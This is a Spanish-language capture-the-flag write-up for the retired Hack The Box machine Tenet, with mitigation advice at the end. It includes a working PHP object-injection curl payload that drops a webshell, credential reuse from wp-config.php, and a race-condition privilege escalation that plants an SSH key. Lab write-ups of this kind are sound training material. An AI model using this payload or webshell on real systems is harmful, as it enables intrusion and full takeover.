---
machine: Tenet
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, wordpress, php-object-injection, race-condition, privesc]
---

# Tenet — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

WordPress y un `sator.php` accesible en la IP permiten una inyección de objetos PHP con la clase `DatabaseExport`, que escribe un webshell. La configuración de WordPress filtra las credenciales de la base y `neil` las reutiliza para SSH. `neil` puede ejecutar `enableSSH.sh` como root; el script tiene una condición de carrera al escribir una clave y permite añadir una propia.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22/tcp` OpenSSH en Ubuntu 18.04 y `80/tcp` Apache con la página por defecto.
- `gobuster` encuentra `/wordpress`; `wpscan` identifica la versión y usuarios.
- El vhost `tenet.htb` tiene un comentario que menciona `sator.php`.

## Enumeración

- `sator.php` existe en la IP y acepta el parámetro `arepo` con datos serializados.
- La clase `DatabaseExport` tiene `user_file` y `data`, y escribe el segundo en el primero.
- `wp-config.php` contiene las credenciales de la base para `neil`.

## Foothold

Se serializa un `DatabaseExport` con `user_file=0xdf.php` y `data=<?php system($_REQUEST['cmd']); ?>`, se envía a `sator.php` y se ejecuta el webshell.

```bash
curl -G http://<IP>/sator.php --data-urlencode 'arepo=O:14:"DatabaseExport":2:{s:9:"user_file";s:8:"0xdf.php";s:4:"data";s:34:"<?php system($_REQUEST["cmd"]); ?>";}'
curl 'http://<IP>/0xdf.php?cmd=id'
```

## Movimiento lateral

La shell es `www-data`. Las credenciales de la base en `wp-config.php` funcionan para `neil` por SSH; su home contiene la flag de usuario.

## Escalada de privilegios

`neil` puede ejecutar `/usr/local/bin/enableSSH.sh` como root. El script crea un archivo temporal, escribe una clave y lo mueve a `authorized_keys`; se compite con él para que la clave propia quede en el archivo final.

```bash
sudo -l
# ejecutar enableSSH.sh en bucle y sustituir el archivo temporal
sudo /usr/local/bin/enableSSH.sh
```

## Evidencia

- `sator.php` con objeto `DatabaseExport` y webshell.
- Credenciales de `neil` y sesión SSH.
- `enableSSH.sh` con condición de carrera y clave en `authorized_keys`.

## Lecciones aprendidas

- Un `unserialize` sobre entrada del usuario permite escribir archivos y ejecutar código.
- Las credenciales de WordPress suelen reutilizarse a nivel de sistema.
- Los scripts privilegiados con archivos temporales son vulnerables a carreras.

## Mitigación y detección

- No deserializar datos externos; usar JSON y validar clases permitidas.
- Rotar credenciales de la base y no reutilizarlas para SSH.
- Usar `mktemp` y operaciones atómicas en scripts privilegiados.

## Referencias

- [0xdf — Tenet](https://0xdf.gitlab.io/2021/06/12/htb-tenet.html)
- [IppSec — Tenet](https://www.youtube.com/watch?v=LhdE7dXbTQw)
- [Hack The Box — Tenet](https://app.hackthebox.com/machines/tenet)
